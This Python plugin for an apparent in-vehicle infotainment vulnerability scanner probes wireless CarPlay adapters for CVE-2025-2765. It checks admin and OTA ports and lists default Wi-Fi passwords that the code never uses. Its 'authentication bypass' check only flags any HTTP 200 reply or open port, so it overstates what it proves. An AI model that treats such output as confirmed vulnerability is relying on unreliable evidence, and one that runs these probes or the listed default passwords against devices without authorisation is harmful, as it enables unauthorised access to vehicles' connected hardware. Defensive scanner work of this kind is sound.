#!/usr/bin/env python3
"""
PoC Name: Wireless Dongle Auth Bypass
CVE: CVE-2025-2765
Component: Application Stack
Category: Application
Severity: Critical
CVSS: 8.8
Description: 无线CarPlay/AA适配器硬编码WiFi凭据和认证绕过
Prerequisites: 目标无线适配器可达。
Usage: python3 10_CVE_2025_2765_Authentication_Bypass_Active_Validation.py <target_ip>
"""
from __future__ import annotations

import socket
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
VULN = {
    "id":             0,
    "cve":            "CVE-2025-2765",
    "year":           2025,
    "domain":         "application",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "Wireless Dongle Auth Bypass",
    "source_url":     "https://nvd.nist.gov/vuln/detail/CVE-2025-2765",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://nvd.nist.gov/vuln/detail/CVE-2025-2765"],
    "signature_tokens": ["CVE-2025-2765"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CVE-2025-2765 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CVE-2025-2765") if vuln else "CVE-2025-2765",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class CarlinKitBypassPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-010"
    meta_poc_name = 'CVE-2025-2765 认证绕过 Active Validation'
    meta_cve_id = "CVE-2025-2765"
    meta_source_url = "https://nvd.nist.gov/vuln/detail/CVE-2025-2765"
    meta_references = ['https://nvd.nist.gov/vuln/detail/CVE-2025-2765']
    meta_severity = "Critical"
    meta_protocol = "unknown"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    meta_profiles         = ["application"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    WEAK_PASSWORDS = ["12345678", "88888888", "00000000", "autokit123"]
    def check_prerequisites(self):
        if not self.target_ip:
            raise RuntimeError("需要指定目标IP地址")
        return True
    def exploit(self):
        self.logger.info(f"无线适配器认证绕过测试 {self.target_ip}")
        self.logger.info("CVE-2025-2765: 硬编码Wi-Fi凭据 + 认证绕过")
        # Check for web admin panel
        for port in [80, 8080, 443]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                if s.connect_ex((self.target_ip, port)) == 0:
                    req = f"GET / HTTP/1.0\r\nHost: {self.target_ip}\r\n\r\n"
                    s.send(req.encode())
                    resp = s.recv(2048).decode("utf-8", "ignore")
                    if "200 OK" in resp or "autokit" in resp.lower() or "carplay" in resp.lower():
                        self.logger.warning(f"[+] Web管理面板发现于端口 {port}")
                        self.results["vulnerable"] = True
                        self.results["evidence"] = f"Web admin panel on port {port}"
                        s.close()
                        return self.results
                s.close()
            except:
                pass
        # Check OTA update port (common: 19000, 18000)
        for port in [19000, 18000, 12345]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                if s.connect_ex((self.target_ip, port)) == 0:
                    self.logger.warning(f"[+] OTA/控制端口 {port} 开放")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = f"OTA port {port} open"
                    s.close()
                    return self.results
                s.close()
            except:
                pass
        self.logger.info("[-] 未发现可利用的管理接口")
        self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 10_CVE_2025_2765_Authentication_Bypass_Active_Validation.py <target_ip>")
        sys.exit(1)
    plugin = CarlinKitBypassPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
